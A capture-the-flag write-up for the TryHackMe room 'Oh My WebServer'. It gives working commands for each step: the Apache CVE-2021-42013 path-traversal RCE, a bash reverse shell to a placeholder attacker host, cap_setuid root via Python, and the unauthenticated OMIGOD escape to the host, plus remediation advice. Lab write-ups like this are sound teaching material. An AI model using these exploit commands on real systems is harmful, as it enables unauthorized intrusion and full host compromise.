# Oh My WebServer — TryHackMe Writeup

> **Room:** [Oh My WebServer](https://tryhackme.com/room/ohmyweb) · **Difficulty:** Medium
> **Category:** Web / Container Escape
> **Author of writeup:** 0xnyx
> **Goal:** Get RCE on the web app, root the container, then escape to root on the host.

> ⚠️ In line with TryHackMe's [write-up policy](https://tryhackme.com/room/ohmyweb), **no flags are included** — only the method.

---

## How to read this writeup

Each step: **Do** → **You get** → **Why / what next**. This box has three layers — web app → inside a Docker container → the real host — and we root each layer in turn.

---

## Step 1 — Port scan (spot the vulnerable version)

**Do** — Version scan; the version number is the whole point here.

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22/tcp open  ssh   OpenSSH ...
80/tcp open  http  Apache httpd 2.4.49 (Unix)
```

**Why / what next** — **Apache 2.4.49** is the giveaway. That exact version has **CVE-2021-42013** — a path-traversal flaw that becomes **Remote Code Execution** when `mod_cgi` is enabled. We don't need to enumerate directories; we go straight for the known CVE.

---

## Step 2 — Foothold (CVE-2021-42013 path traversal → RCE)

**Do** — The bug lets us traverse out of the web root to a real binary like `/bin/sh` and feed it commands in the POST body. Apache blocks a plain `../`, so each traversal segment is encoded as `.%2e` (the `.` + URL-encoded `.`). `--path-as-is` stops curl from "tidying" the `../` away.

```bash
curl -s --path-as-is 'http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
  -d 'echo Content-Type: text/plain; echo; id; hostname'
```

**You get**

```
uid=1(daemon) gid=1(daemon) ...
<12-character-hex-string>        <- this is the hostname
```

**Why / what next** — Code is executing as the `daemon` user → foothold confirmed. The hostname being a **12-char hex string** is the classic sign we're **inside a Docker container**, not the real host. Upgrade to a reverse shell the same way (start `nc -lvnp <PORT>` first):

```bash
curl -s --path-as-is 'http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
  -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1'
```

Next: become root *inside the container*.

---

## Step 3 — Container root (Linux capabilities)

**Do** — Hunt for binaries that carry dangerous file **capabilities** (a finer-grained alternative to SUID).

```bash
getcap -r / 2>/dev/null
```

**You get**

```
/usr/bin/python3.7 = cap_setuid+ep
```

**Why / what next** — `cap_setuid` on a Python binary means that Python can **set its own UID to 0** — instant root inside the container, no password ([GTFOBins: python/cap_setuid](https://gtfobins.github.io/gtfobins/python/#capabilities)):

```bash
/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**You get** — A root shell inside the container; the **user flag** is in the container's `/root/`.

**Why / what next** — We own the container, but the container is a cage. The real target is the host. Next: look outward from the container at the Docker network.

---

## Step 4 — Container escape (OMIGOD, CVE-2021-38647)

**Do** — From inside the container, the host is usually reachable at the Docker gateway `172.17.0.1`. Scan it for interesting services using pure bash (no nmap needed).

```bash
for p in 22 80 1270 5985 5986; do
  timeout 1 bash -c "echo > /dev/tcp/172.17.0.1/$p" 2>/dev/null && echo "$p OPEN"
done
```

**You get**

```
5986 OPEN
```

**Why / what next** — Port **5986** (and 1270) is Microsoft's **OMI** agent. OMI of this era is vulnerable to **CVE-2021-38647 (OMIGOD)**: if you send a request with an **empty authentication header**, OMI assumes the request is internal/trusted and runs your command **as root on the host**. It's completely unauthenticated — one SOAP request = host root.

**Do** — Send an `ExecuteShellCommand` SOAP request with no auth. Put your command inside `<p:command>` (e.g. `id; hostname; cat /root/root.txt`) in the XML body; namespaces must be complete or OMI rejects it.

```bash
curl -s -k -X POST https://172.17.0.1:5986/wsman \
 -H "Content-Type: application/soap+xml;charset=UTF-8" \
 --data-binary @omigod.xml
```

**You get**

```xml
<p:ReturnCode>0</p:ReturnCode>
<p:StdOut>uid=0(root) ...  <HOST-hostname> ...</p:StdOut>
```

**Why / what next** — `ReturnCode 0`, `uid=0(root)`, and a **different (host) hostname** confirm we've broken out of the container onto the host as root. The **root flag** is in the host's `/root/`. Box fully owned.

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | nmap | Apache 2.4.49 → known CVE |
| 2 | CVE-2021-42013 (`.%2e` traversal) | RCE as daemon (in a container) |
| 3 | `getcap` → `cap_setuid` on python | Root inside container (user flag) |
| 4 | OMIGOD CVE-2021-38647 on :5986 | Root on the host (root flag) |

## Lessons

- Apache **2.4.49 / 2.4.50** → CVE-2021-42013 / CVE-2021-41773 (path traversal, RCE with mod_cgi). Use `--path-as-is` + `.%2e` encoding.
- `getcap -r /` is a core privesc check — `cap_setuid` on an interpreter is instant root.
- A **12-char hex hostname** = you're in a container → scan the Docker gateway `172.17.0.1` for host services.
- **OMIGOD (CVE-2021-38647)** on OMI (ports 5986/1270) is unauthenticated root RCE — one SOAP request with an empty auth header.

## Remediation

- Patch Apache (≥ 2.4.51) and disable `mod_cgi` where it isn't needed.
- Don't grant Linux capabilities to interpreters.
- Patch or remove OMI; never expose it, and don't let containers reach sensitive host agents.

---

*Write-up for [TryHackMe — Oh My WebServer](https://tryhackme.com/room/ohmyweb).*
